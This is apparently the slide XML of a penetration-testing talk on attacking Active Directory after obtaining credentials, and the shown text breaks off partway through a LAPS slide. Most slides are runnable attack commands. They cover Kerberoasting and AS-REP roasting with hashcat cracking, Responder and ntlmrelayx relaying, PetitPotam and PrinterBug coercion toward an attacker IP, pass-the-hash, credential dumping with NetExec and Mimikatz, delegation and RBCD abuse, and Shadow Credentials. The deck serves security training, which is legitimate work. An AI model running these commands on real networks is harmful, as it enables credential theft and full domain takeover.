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hvtBNeoypu/NwUcN4MjrQaO7n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2530eb87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d2530eb87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d2530eb87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Mr-Whiskerss" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.linkedin.com/in/daniel-little-b4a171101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411480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0"/>
              <a:buFont typeface="Consolas"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="60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 sz="6000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ttacking AD</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="60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 103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65740" y="225174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You Have Credentials.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65740" y="285108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Now What?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40" y="3771913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deep-dive into post-credential Active Directory attack tooling and techniques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2530eb87f_0_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d2530eb87f_0_4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="156000" y="200627"/>
            <a:ext cx="8805000" cy="4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0"/>
              <a:buFont typeface="Consolas"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6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WhoAmi?</a:t>
            </a:r>
            <a:endParaRPr sz="6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Job Role: Senior </a:t>
            </a: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Adversary</a:t>
            </a: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Simulation tester @ JumpSec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Experience: 9 Years Pentesting 2 years Network engineer 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Overview: All round pentester cyber security nerd with a passion for sharing knowledge.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Github:- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng">
                <a:solidFill>
                  <a:srgbClr val="7890CD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https://github.com/Mr-Whiskerss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Discord:- mr__whiskers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-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US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Linked: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" u="sng">
                <a:solidFill>
                  <a:srgbClr val="7890CD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https://www.linkedin.com/in/daniel-little-b4a171101/</a:t>
            </a:r>
            <a:endParaRPr sz="2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2530eb87f_0_4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d2530eb87f_0_4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4846320"/>
            <a:ext cx="8412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35 slides | ~45 minutes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82880" y="1188720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82880" y="1188720"/>
            <a:ext cx="4297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74320" y="128016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296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Scene Setting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15727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Assumed breach — where we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82880" y="2084832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82880" y="2084832"/>
            <a:ext cx="429768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74320" y="2176272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" y="21762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2960" y="24688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BloodHound, PowerView, password hunting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82880" y="2980944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182880" y="2980944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0" y="3072384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22960" y="30723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Kerberos Abuse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22960" y="336499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Roasting, AS-REP, OPtH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82880" y="3877056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82880" y="3877056"/>
            <a:ext cx="4297680" cy="54864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74320" y="3968496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22960" y="39684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NTLM Relay &amp; Coercion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22960" y="4261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Responder, ntlmrelayx, PetitPotam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54880" y="1188720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54880" y="1188720"/>
            <a:ext cx="429768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46320" y="128016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9496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Lateral Movement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94960" y="15727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PTH, PTT, Impacket, NetExec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2084832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754880" y="2084832"/>
            <a:ext cx="4297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46320" y="2176272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394960" y="21762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Priv Esc &amp; ACL Abuse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394960" y="24688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DACL, delegation, Shadow Creds, LAPS, gMSA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754880" y="2980944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754880" y="2980944"/>
            <a:ext cx="429768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846320" y="3072384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394960" y="30723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Domain Dominance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394960" y="336499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DCSync, Golden/Silver, ADCS, cross-trust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754880" y="3877056"/>
            <a:ext cx="4297680" cy="7315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754880" y="3877056"/>
            <a:ext cx="4297680" cy="54864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846320" y="3968496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94960" y="39684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C2, BOFs &amp; Evasion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394960" y="4261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Sliver, Havoc, AMSI, in-memory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Scene Setting: Assumed Breach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You have valid credentials. The real work starts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82880" y="1143000"/>
            <a:ext cx="4206240" cy="35204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82880" y="1143000"/>
            <a:ext cx="4206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65760" y="12618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The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5760" y="1600200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You have credentials via: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184708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Phishing / credential harvesting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5760" y="209397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Password spray on M365 / OWA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5760" y="2340864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OSINT / credential leaks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258775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Initial foothold via exploit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2834640"/>
            <a:ext cx="384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Client-provided (assumed breach)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3081528"/>
            <a:ext cx="384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 Any of the 102 path ways not covered above!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5760" y="332841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Goal: Domain Admin / crown jewels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17720" y="1143000"/>
            <a:ext cx="4297680" cy="35204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617720" y="1143000"/>
            <a:ext cx="4297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Attack Phases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754880" y="1618488"/>
            <a:ext cx="36576" cy="38404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892040" y="162763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1. Enumerate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892040" y="182880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BloodHound, PowerView, LDAP, shares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754880" y="2121408"/>
            <a:ext cx="36576" cy="38404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92040" y="213055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2. Identify Paths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92040" y="233172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Shortest path to DA in BH graph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754880" y="2624328"/>
            <a:ext cx="36576" cy="384048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892040" y="263347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3. Relay / Coerce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892040" y="283464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NTLM relay, printer bug, PetitPotam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754880" y="3127248"/>
            <a:ext cx="36576" cy="384048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892040" y="313639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4. Exploit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892040" y="333756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Kerberos abuse, ACLs, misconfigs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754880" y="3630168"/>
            <a:ext cx="36576" cy="38404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892040" y="363931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5. Move Laterally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892040" y="384048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PTH, PTT, exec via SMB/WMI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754880" y="4133088"/>
            <a:ext cx="36576" cy="38404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892040" y="4142232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6. Escalate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434340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DCSync, ADCS, Golden Ticket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D0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Know the terrain before you move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BloodHound / SharpHound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Graph-based AD attack path enumeration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82880" y="10789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BloodHound ingests AD relationships and visualises attack paths to Domain Admin using graph theory. The single most important enumeration tool on any engagement.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82880" y="1627632"/>
            <a:ext cx="4160520" cy="16916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82880" y="1627632"/>
            <a:ext cx="416052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174650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Data Collection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28600" y="2029968"/>
            <a:ext cx="4069080" cy="121615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20040" y="2103120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Python collector (Linux/CE)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bloodhound-python -u user -p 'pass'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 corp.local -c All --zip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SharpHound (Windows, stealth mode)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SharpHound.exe -c All --stealth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--zipfilename bh_$(date +%s).zip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0" y="1627632"/>
            <a:ext cx="4389120" cy="16916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572000" y="1627632"/>
            <a:ext cx="438912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754880" y="17465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Essential Cypher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617720" y="2029968"/>
            <a:ext cx="4297680" cy="121615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709160" y="2103120"/>
            <a:ext cx="41148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Shortest path any user → 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MATCH p=shortestPath((u:User)-[*1..]-&gt;(g:Group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{name:"DOMAIN ADMINS@CORP.LOCAL"}))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RETURN p LIMIT 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All Keroastable + find their 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MATCH (u:User {hasspn:true}) RETURN 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82880" y="3410712"/>
            <a:ext cx="2852928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82880" y="3410712"/>
            <a:ext cx="2852928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20040" y="352958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BloodHound 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0040" y="3813048"/>
            <a:ext cx="25786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Community Edition recommended — active development, API-driven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172968" y="3410712"/>
            <a:ext cx="2852928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172968" y="3410712"/>
            <a:ext cx="2852928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310128" y="352958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LDAP Noise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310128" y="3813048"/>
            <a:ext cx="25786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SharpHound generates LDAP queries — use --stealth on red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163056" y="3410712"/>
            <a:ext cx="2852928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163056" y="3410712"/>
            <a:ext cx="2852928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300216" y="352958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Custom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300216" y="3813048"/>
            <a:ext cx="25786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Bloodhound-owned / PlumHound for automated reporting from BH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Manual Enumeration: PowerView &amp; LDAP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Targeted queries when BloodHound is too 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82880" y="1078992"/>
            <a:ext cx="4206240" cy="3749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82880" y="1078992"/>
            <a:ext cx="42062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65760" y="11978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PowerView (PowerSploit)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28600" y="1490472"/>
            <a:ext cx="4114800" cy="32004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20040" y="1563624"/>
            <a:ext cx="3931920" cy="3072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Domain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Get-Domain; Get-DomainController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-SPN              # Keroastable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-Properties *      # All properties incl. desc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| Where{$_.description -ne $null}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Groups &amp; membership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Get-DomainGroupMember 'Domain Admins'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Get-DomainGroup -AdminCount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Computers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Get-DomainComputer -Unconstrained  # Unconstrained delegation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Get-DomainComputer -LAPS           # LAPS-enabled hosts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ACLs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Find-InterestingDomainAcl -ResolveGUIDs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Get-ObjectAcl -Identity user -ResolveGUIDs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Shares / sessions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Find-DomainShare -CheckShareAccess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Get-NetSession -ComputerName dc01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617720" y="1078992"/>
            <a:ext cx="4297680" cy="17373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617720" y="107899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800600" y="11978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ldapdomaindump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663440" y="1490472"/>
            <a:ext cx="4206240" cy="126187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754880" y="1563624"/>
            <a:ext cx="40233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ldapdomaindump -u 'CORP\user' -p 'pass'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ldap://dc01.corp.local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HTML/JSON reports for all objects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617720" y="2907792"/>
            <a:ext cx="4297680" cy="1920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617720" y="2907792"/>
            <a:ext cx="4297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800600" y="30266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windapsearch / ldapsearch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663440" y="3319272"/>
            <a:ext cx="4206240" cy="138988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754880" y="3392424"/>
            <a:ext cx="40233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windapsearch (Go)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windapsearch -d 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 user@corp.local -p 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--da --unconstrained-users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Custom LDAP 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windapsearch -d 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 user@corp.local -p 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--custom '(ms-MCS-AdmPwd=*)'  # LAPS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Password Hunting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Credentials hiding in plain sight — shares, descriptions, GPP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82880" y="1078992"/>
            <a:ext cx="8778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Before reaching for complex attacks, look for passwords stored in accessible places. This finds creds on a surprisingly high proportion of real engagements.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82880" y="1572768"/>
            <a:ext cx="4206240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82880" y="1572768"/>
            <a:ext cx="4206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6576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Snaffler — Share Trawling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28600" y="1975104"/>
            <a:ext cx="4114800" cy="96012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20040" y="2048256"/>
            <a:ext cx="3931920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Windows — enumerate &amp; harvest from shares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Snaffler.exe -s -o snaffler_out.log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Linux via Manspider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manspider 10.10.10.0/24 -u user -p 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-e ps1 bat cmd txt -c password pass cred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617720" y="1572768"/>
            <a:ext cx="4297680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617720" y="1572768"/>
            <a:ext cx="429768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800600" y="16916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GPP / cPassword (MS14-025)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663440" y="1975104"/>
            <a:ext cx="4206240" cy="96012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754880" y="2048256"/>
            <a:ext cx="4023360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Find Group Policy Preference creds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Get-GPPPassword          # PowerSploit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Get-GPPAutologn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From Linux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gpp-decrypt &lt;cpassword_hash&gt;   # decrypt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82880" y="3063240"/>
            <a:ext cx="2743200" cy="17830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82880" y="3063240"/>
            <a:ext cx="274320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65760" y="31821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AD Descriptions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28600" y="3465576"/>
            <a:ext cx="2651760" cy="13075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20040" y="3538728"/>
            <a:ext cx="246888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PowerView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| Where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$_.description -ne $null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} | Select name,description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ldapsearch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ldapsearch ... '(description=*pass*)'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090672" y="3063240"/>
            <a:ext cx="2651760" cy="17830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090672" y="3063240"/>
            <a:ext cx="265176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3246120" y="31821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SYSVOL / Scripts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136392" y="3465576"/>
            <a:ext cx="2560320" cy="13075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227832" y="3538728"/>
            <a:ext cx="237744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Mount SYSVOL and grep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net use Z: \\dc01\SYSVOL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Get-ChildItem Z:\ -Recurse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-Include *.bat,*.ps1,*.vbs |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Select-String -Pattern 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897880" y="3063240"/>
            <a:ext cx="3017520" cy="17830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897880" y="3063240"/>
            <a:ext cx="3017400" cy="5490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053328" y="31821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nsolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>KeePass / Flat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0" y="3465576"/>
            <a:ext cx="2926080" cy="13075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035040" y="3538728"/>
            <a:ext cx="274320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Find KeePass databases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Get-ChildItem C:\ -Recurse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-Include *.kdbx -EA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Crack: keepass2john + hashcat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keepass2john db.kdbx &gt; kp.hash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hashcat -m 13400 kp.hash rockyou.txt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A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KERBEROS ABUSE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The authentication protocol that keeps on giving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Kerberoasting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Request TGS tickets for SPN accounts — crack offline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82880" y="10789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Any authenticated domain user can request a TGS for any SPN-registered service account. The ticket is encrypted with the service account's NTLM hash — take it offline and crack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82880" y="1664208"/>
            <a:ext cx="8778240" cy="877824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82880" y="1664208"/>
            <a:ext cx="8778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65760" y="17647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Impacket GetUserSPNs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834640" y="1737360"/>
            <a:ext cx="6035040" cy="6583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2926080" y="1810512"/>
            <a:ext cx="5852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GetUserSPNs.py 'corp.local/user:pass' -dc-ip 10.10.10.1 -request -outputfile hashes.kerberoast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Targeted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GetUserSPNs.py 'corp.local/user:pass' -dc-ip 10.10.10.1 -request-user svc_sql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82880" y="2633472"/>
            <a:ext cx="8778240" cy="877824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82880" y="2633472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65760" y="273405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Rubeus (Windows)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834640" y="2706624"/>
            <a:ext cx="6035040" cy="6583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2926080" y="2779776"/>
            <a:ext cx="5852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All SPN accounts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kerberoast /format:hashcat /outfile:hashes.txt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Targeted + RC4 downgrade (easier crack)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kerberoast /user:svc_sql /tgtdeleg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82880" y="3602736"/>
            <a:ext cx="8778240" cy="877824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82880" y="3602736"/>
            <a:ext cx="87782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65760" y="37033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PowerView + Invoke-Kerberoast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834640" y="3675888"/>
            <a:ext cx="6035040" cy="6583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2926080" y="3749040"/>
            <a:ext cx="5852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Pipe directly to hashcat format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Invoke-Kerberoast -OutputFormat Hashcat | fl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-SPN | Get-DomainSPNTicket -Format Hashcat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82880" y="4617720"/>
            <a:ext cx="8778240" cy="274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82880" y="4617720"/>
            <a:ext cx="8778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65760" y="463600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CRACK:  hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force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AS-REP Roasting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Targets accounts that don't require Kerberos pre-auth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82880" y="10789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Accounts with 'Do not require Kerberos pre-authentication' set allow anyone to request an AS-REP — the encrypted portion is crackable offline. No credentials required to collect.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82880" y="1627632"/>
            <a:ext cx="4206240" cy="26517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From Linux (Impacket)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28600" y="2029968"/>
            <a:ext cx="4114800" cy="2148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320040" y="2103120"/>
            <a:ext cx="3931920" cy="20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With creds — enumerate targets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GetNPUsers.py corp.local/ -usersfile users.txt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-dc-ip 10.10.10.1 -format hashcat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-outputfile asrep_hashes.txt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No creds — spray user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GetNPUsers.py corp.local/ -no-pass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-usersfile users.txt -dc-ip 10.10.10.1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hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule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617720" y="1627632"/>
            <a:ext cx="4297680" cy="26517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From Windows (Rubeus)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663440" y="2029968"/>
            <a:ext cx="4206240" cy="2148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754880" y="2103120"/>
            <a:ext cx="4023360" cy="20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Dump all AS-REP roastable hashes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asreproast /format:hashcat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Target specific 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asreproast /user:john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/format:hashcat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Enumerate targets with BH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MATCH (u:User {dontreqpreauth:true}) RETURN u.name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82880" y="438912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⚠  Combine with BloodHound:  MATCH (u:User {dontreqpreauth:true}) RETURN u  — shows impact immediately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Over-Pass-the-Hash (OPtH)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Convert an NTLM hash into a fully usable Kerberos TGT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Standard PTH uses NTLM — detectable and blocked in environments enforcing Kerberos-only. OPtH upgrades an NTLM hash into a Kerberos TGT, granting full Kerberos authentication in the name of the victim.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82880" y="1664208"/>
            <a:ext cx="877824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182880" y="1664208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65760" y="178308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Why OPtH?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286000" y="1755648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PTH = NTLM auth → triggers NTLM logon events (4776) and may be blocked.  OPtH = Kerberos → blends in with normal auth traffic, bypasses NTLM-disabled restrictions, and gives you a real TGT you can use for further attacks (S4U, delegation).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82880" y="2404872"/>
            <a:ext cx="4206240" cy="2011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82880" y="2404872"/>
            <a:ext cx="4206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365760" y="2523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Rubeus (Windows)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228600" y="2807208"/>
            <a:ext cx="4114800" cy="15361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320040" y="2880360"/>
            <a:ext cx="393192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OPtH — request TGT using hash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asktgt /user:jsmith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/rc4:NTLM_HASH_HERE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/domain:corp.local /ptt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Or with AES256 key (more stealthy)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asktgt /user:jsmith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/aes256:AES_KEY /opsec /ptt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617720" y="2404872"/>
            <a:ext cx="4297680" cy="2011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4617720" y="2404872"/>
            <a:ext cx="4297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800600" y="252374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Impacket + Mimikatz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663440" y="2807208"/>
            <a:ext cx="4206240" cy="15361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754880" y="2880360"/>
            <a:ext cx="402336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Mimikatz — OPtH to spawn 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sekurlsa::pth /user:jsmith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/ntlm:HASH /domain:corp.local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/run:cmd.exe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Use new cmd for Kerberos-based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dir \\dc01\C$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klist  # confirm TGT injected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82880" y="4526280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⚠  AES256 keys are extracted with DCSync or sekurlsa::ekeys — more OPSEC-safe than RC4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00D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NTLM RELAY &amp; COERCION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Force machines to authenticate — then relay or crack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NTLM Relay Attacks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Intercept NTLM auth and relay it to another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NTLM relay intercepts an authentication attempt and forwards it to a different service, authenticating as the victim. Requires SMB signing disabled on the target (default on workstations, sometimes servers).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82880" y="1627632"/>
            <a:ext cx="4206240" cy="16916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Step 1: Responder (Poison LLMNR/NBT-NS)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28600" y="2029968"/>
            <a:ext cx="4114800" cy="12344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20040" y="2103120"/>
            <a:ext cx="393192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Disable SMB/HTTP in Responder.conf first!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Then run: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Responder -I eth0 -dwv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Responder will capture NTLMv2 hashes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crack with hashcat -m 5600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617720" y="1627632"/>
            <a:ext cx="4297680" cy="16916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Step 2: ntlmrelayx (Impacket)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663440" y="2029968"/>
            <a:ext cx="4206240" cy="12344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754880" y="2103120"/>
            <a:ext cx="402336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Basic relay — dump SAM on target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ntlmrelayx.py -tf targets.txt -smb2support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Interactive shell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ntlmrelayx.py -tf targets.txt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-smb2support -i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Execute command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ntlmrelayx.py -tf targets.txt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-smb2support -c 'whoami'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82880" y="3401568"/>
            <a:ext cx="4206240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82880" y="3401568"/>
            <a:ext cx="42062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365760" y="35204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Relay to LDAP — Own the Domain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228600" y="3803904"/>
            <a:ext cx="4114800" cy="98755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20040" y="3877056"/>
            <a:ext cx="39319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Relay machine account → LDAP → DCSync rights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ntlmrelayx.py -t ldap://dc01 --escalate-user attacker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Relay → Shadow Credentials (msDS-KeyCred)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ntlmrelayx.py -t ldaps://dc01 --shadow-credentials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617720" y="3401568"/>
            <a:ext cx="4297680" cy="1417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617720" y="3401568"/>
            <a:ext cx="4297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800600" y="35204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Find Targets Without SMB Signing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663440" y="3803904"/>
            <a:ext cx="4206240" cy="98755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4754880" y="3877056"/>
            <a:ext cx="40233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NetExec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10.10.10.0/24 --gen-relay-list targets.txt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Nmap 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nmap -p445 --script smb-security-mode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10.10.10.0/24 | grep -i 'signing: disabled'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Authentication Coercion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Force a machine to authenticate to you — then relay or capture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7223760" y="201168"/>
            <a:ext cx="1554480" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16667" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B8A">
              <a:alpha val="20000"/>
            </a:srgbClr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7223760" y="2011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GAME CHANGER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82880" y="10789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Coercion forces a target machine (often a DC or server) to initiate an outbound NTLM authentication to an attacker-controlled host — chain with NTLM relay to own the domain.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82880" y="1627632"/>
            <a:ext cx="8778240" cy="102412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182880" y="1627632"/>
            <a:ext cx="8778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65760" y="17190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PetitPotam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65760" y="20116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Abuses MS-EFSRPC to force DC auth. Unauthenticated on unpatched systems. Most reliable modern coercer.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657600" y="1719072"/>
            <a:ext cx="5212080" cy="859536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749040" y="1792224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Unauthenticated (older DCs)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PetitPotam.py -u '' -p '' attacker_ip dc01.corp.local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Authenticated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PetitPotam.py -u user -p pass attacker_ip dc01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82880" y="2743200"/>
            <a:ext cx="8778240" cy="102412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182880" y="2743200"/>
            <a:ext cx="8778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365760" y="28346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SpoolSample / PrinterBug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65760" y="312724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MS-RPRN coercion via print spooler. Spooler must be running. Classic and reliable.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3657600" y="2834640"/>
            <a:ext cx="5212080" cy="859536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3749040" y="2907792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SpoolSample (C#)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SpoolSample.exe dc01.corp.local attacker_ip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printerbug.py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printerbug.py 'corp/user:pass'@dc01 attacker_ip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82880" y="3858768"/>
            <a:ext cx="8778240" cy="102412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182880" y="3858768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365760" y="39502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Coercer (all-in-one)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65760" y="4242816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Automated tool testing 12+ coercion methods including MS-EFSRPC, MS-RPRN, MS-FSRVP, and more.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657600" y="3950208"/>
            <a:ext cx="5212080" cy="859536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3749040" y="402336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Scan for coercable hosts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Coercer.py scan -t 10.10.10.0/24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 user -p pass -d corp.loca</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:srgbClr val="3FB9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Coerce a specific target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Coercer.py coerce -t dc01 \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-l attacker_ip -u user -p pass -d corp.local</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:srgbClr val="3FB9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" y="4930455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⚠  Chain: C</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="10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b="0" i="0" lang="en-US" sz="10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ercion → Responder/ntlmrelayx → LDAP relay → DCSync rights or ADCS ESC8 → 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007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LATERAL MOVEMENT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Move through the network using what you have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Pass-the-Hash &amp; Pass-the-Ticket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Authenticate without knowing plaintext credentials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182880" y="1078992"/>
            <a:ext cx="8778240" cy="16276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82880" y="1078992"/>
            <a:ext cx="8778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Pass-the-Hash  (PTH)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365760" y="1463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Use an NTLM hash directly over SMB/WMI/RDP. No plaintext needed.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228600" y="1673352"/>
            <a:ext cx="8686800" cy="8869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320040" y="1746504"/>
            <a:ext cx="85039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impacket-psexec  corp.local/admin@10.10.10.5 -hashes :NTHASH         # SYSTEM via SMB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impacket-wmiexec corp.local/admin@10.10.10.5 -hashes :NTHASH         # semi-interactive WMI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xfreerdp /v:10.10.10.5 /u:admin /pth:NTHASH /cert:ignore /dynamic-resolution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82880" y="2816352"/>
            <a:ext cx="8778240" cy="16276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182880" y="2816352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365760" y="29260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Pass-the-Ticket  (PTT)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365760" y="32004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Inject a stolen or forged Kerberos TGT/TGS — impersonate users without credentials or NTLM.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228600" y="3410712"/>
            <a:ext cx="8686800" cy="8869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320040" y="3483864"/>
            <a:ext cx="85039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Dump tickets from LSASS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dump /nowrap /service:krbtgt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Inject a .kirbi / base64 ticket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ptt /ticket:&lt;base64&gt;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Impacket using ccache ticket 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export KRB5CCNAME=ticket.ccache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impacket-psexec -k -no-pass corp.local/user@dc01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82880" y="4553712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⚠  PTH requires NTLM enabled.  PTT leaves tickets in LSASS — consider Rubeus /enctype:aes256 for OPSEC.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The Impacket Suite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Python toolkit for AD network protocol interaction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82880" y="1078992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182880" y="1078992"/>
            <a:ext cx="28346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292608" y="1170432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psexec.py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292608" y="1426464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SMB exec — drops a svc binary, SYSTEM shell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172968" y="1078992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3172968" y="1078992"/>
            <a:ext cx="28346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3282696" y="1170432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wmiexec.py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3282696" y="1426464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WMI exec — semi-interactive, no binary on disk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6163056" y="1078992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6163056" y="1078992"/>
            <a:ext cx="28346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6272784" y="1170432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smbexec.py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6272784" y="1426464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SMB exec via service — noisier, fully fileless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182880" y="2066544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182880" y="2066544"/>
            <a:ext cx="28346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292608" y="2157984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atexec.py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292608" y="2414016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Task Scheduler exec — blind, output via share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3172968" y="2066544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3172968" y="2066544"/>
            <a:ext cx="28346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3282696" y="2157984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secretsdump.py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3282696" y="2414016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Dump SAM/LSA/NTDS.DIT remotely or DCSync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6163056" y="2066544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6163056" y="2066544"/>
            <a:ext cx="28346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6272784" y="2157984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GetUserSPNs.py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6272784" y="2414016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Kerberoasting — request TGS for SPN accounts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182880" y="3054096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182880" y="3054096"/>
            <a:ext cx="28346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292608" y="3145536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GetNPUsers.py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292608" y="3401568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AS-REP Roasting — no-preauth accounts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3172968" y="3054096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3172968" y="3054096"/>
            <a:ext cx="28346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3282696" y="3145536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ticketer.py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3282696" y="3401568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Forge Golden / Silver Kerberos tickets offline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6163056" y="3054096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6163056" y="3054096"/>
            <a:ext cx="2834640" cy="54864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6272784" y="3145536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ntlmrelayx.py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272784" y="3401568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NTLM relay — SMB/LDAP/HTTP relay attacks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182880" y="4041648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182880" y="4041648"/>
            <a:ext cx="283464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292608" y="4133088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lookupsid.py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292608" y="4389120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SID brute-force — enumerate domain users/groups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3172968" y="4041648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3172968" y="4041648"/>
            <a:ext cx="2834640" cy="54864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3282696" y="4133088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reg.py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3282696" y="4389120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Remote registry read/write — dump SAM offline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163056" y="4041648"/>
            <a:ext cx="2834640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6163056" y="4041648"/>
            <a:ext cx="28346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6272784" y="4133088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dpapi.py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6272784" y="4389120"/>
            <a:ext cx="2615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DPAPI blob decryption — browser creds, secrets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NetExec (nxc) — formerly CrackMapExec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Swiss-army knife for mass enumeration, spraying and lateral movement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182880" y="107899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NetExec (nxc) covers SMB/WMI/LDAP/MSSQL/SSH/WINRM simultaneously. Ideal for rapid internal coverage and credential validation.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182880" y="1536192"/>
            <a:ext cx="8778240" cy="3429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182880" y="1536192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228600" y="1600200"/>
            <a:ext cx="8686800" cy="3291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320040" y="1673352"/>
            <a:ext cx="8503920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Spray / validate credentials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10.10.10.0/24 -u user -p 'P@ssw0rd'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10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce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10.10.10.0/24 -u administrator -H NTHASH --local-auth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Enumerate shares, sessions, logged-on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10.10.10.5 -u user -p pass --shares --sessions --loggedon-users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Remote command execution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10.10.10.5 -u admin -H NTHASH -x 'whoami /all'        # cmd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10.10.10.5 -u admin -H NTHASH -X '$env:COMPUTERNAME'  # powershell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Credential dumping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10.10.10.5 -u admin -H NTHASH --sam --lsa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10.10.10.1 -u admin -H NTHASH --ntds          # DC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LDAP — enum, kerberoast, asreproast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--users --groups --password-not-required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--kerberoasting hashes.txt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--asreproast asrep.txt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MSSQL — xp_cmdshell exec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mssql 10.10.10.5 -u sa -p pass -x 'whoami' --local-auth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00D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PRIVILEGE ESCALATION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ACL abuse, delegation, Shadow Creds, LAPS, gMSA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Kerberos Delegation Attacks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Unconstrained, Constrained (S4U2Proxy), and RBCD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182880" y="1078992"/>
            <a:ext cx="8778240" cy="11887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182880" y="1078992"/>
            <a:ext cx="8778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365760" y="11887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Unconstrained Delegation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365760" y="14630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Any service impersonates any user to any target. DA authenticating to this host → TGT stored in LSASS. Combine with coercion (PetitPotam) to force DC auth.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3977640" y="1161288"/>
            <a:ext cx="4892040" cy="1005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4069080" y="1234440"/>
            <a:ext cx="470916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Get-DomainComputer -Unconstrained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monitor /interval:5 /filteruser:Administrator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Coerce DC → capture TGT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PetitPotam.py attacker dc01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ptt /ticket:&lt;captured_tgt&gt;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182880" y="2359152"/>
            <a:ext cx="8778240" cy="11887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182880" y="2359152"/>
            <a:ext cx="8778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365760" y="24688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Constrained Delegation (S4U2Proxy)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365760" y="27432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Delegate to specific SPNs only. Compromise the service account → impersonate any user (incl. DA) to the target SPN. S4U2Self + S4U2Proxy.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3977640" y="2441448"/>
            <a:ext cx="4892040" cy="1005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4069080" y="2514600"/>
            <a:ext cx="470916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Get-DomainUser -TrustedToAuth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s4u /user:svc_iis /rc4:HASH \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/impersonateuser:administrator \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/msdsspn:cifs/dc01.corp.local /ptt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182880" y="3639312"/>
            <a:ext cx="8778240" cy="11887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182880" y="3639312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365760" y="37490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RBCD (Resource-Based Constrained Delegation)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365760" y="40233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Control who can delegate TO a resource. With GenericWrite/Write rights on a computer object → add your own machine account → S4U2Self to impersonate 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3977640" y="3721608"/>
            <a:ext cx="4892040" cy="10058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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4069080" y="3794760"/>
            <a:ext cx="470916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Create machine account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Impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Pass1234' -dc-ip dc01 'corp.local/user:pass'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Set RBCD on target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Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount EVIL$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S4U to get ticket as DA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s4u /user:EVIL$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /ptt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2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Shadow Credentials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Abuse msDS-KeyCredentialLink to own an account without touching the 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Shadow Credentials abuses the msDS-KeyCredentialLink attribute (used by Windows Hello for Business) to add an attacker-controlled certificate to an account. Requires GenericWrite or WriteDACL on the target object.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182880" y="1645920"/>
            <a:ext cx="8778240" cy="56692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182880" y="1645920"/>
            <a:ext cx="87782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365760" y="171907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Attack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1828800" y="1700784"/>
            <a:ext cx="6949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1. Attacker has GenericWrite on target (user/computer)  →  2. Write attacker-controlled cert to msDS-KeyCredentialLink  →  3. Authenticate as target using PKINIT/Kerberos  →  4. Receive TGT + NTLM hash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182880" y="2286000"/>
            <a:ext cx="4206240" cy="2560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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2286000"/>
            <a:ext cx="4206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365760" y="24048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Pywhisker (Linux)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228600" y="2688336"/>
            <a:ext cx="4114800" cy="208483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320040" y="2761488"/>
            <a:ext cx="3931920" cy="1956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List existing shadow credentials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pywhisker -t target_user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 corp.local -u attacker -p pass --action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Add shadow credential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pywhisker -t target_user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 corp.local -u attacker -p pass --action add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generates .pfx + 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Auth with cert → get hash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pkinittools gettgtpkinit corp.local/target_user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-cert-pfx cert.pfx -pfx-pass PASSWORD ticket.ccache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KRB5CCNAME=ticket.ccache getnthash corp.local/target_user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4617720" y="2286000"/>
            <a:ext cx="4297680" cy="2560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4617720" y="2286000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4800600" y="24048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Whisker (Windows / C#)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4663440" y="2688336"/>
            <a:ext cx="4206240" cy="208483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4754880" y="2761488"/>
            <a:ext cx="4023360" cy="1956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Whisker.exe list /target:target_user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Add shadow credential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Whisker.exe add /target:target_user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gives Rubeus command to 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Rubeus authenticates + returns hash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asktgt /user:target_user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/certificate:&lt;b64&gt;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/password:&lt;pfx_pass&gt;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/getcredentials /show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LAPS Abuse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Local Administrator Password Solution — often readable by more than intended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LAPS stores randomised local admin passwords in AD (ms-Mcs-AdmPwd / msLAPS-Password). Readable by specific groups — but these groups are often too permissive on real engagements.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182880" y="1627632"/>
            <a:ext cx="4206240" cy="26517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Enumerate &amp; Read LAPS (Linux)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228600" y="2029968"/>
            <a:ext cx="4114800" cy="217627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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2103120"/>
            <a:ext cx="3931920" cy="2048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NetExec — check who can read LAPS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--laps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-M laps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ldapsearch — raw LAPS attribute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ldapsearch -H ldap://dc01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 'user@corp.local' -w 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-b 'DC=corp,DC=local'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'(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd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LAPSToolkit (via nxc module)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-M laps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-o computer=WORKSTATION01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4617720" y="1627632"/>
            <a:ext cx="4297680" cy="26517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Enumerate &amp; Read LAPS (Windows)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4663440" y="2029968"/>
            <a:ext cx="4206240" cy="217627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4754880" y="2103120"/>
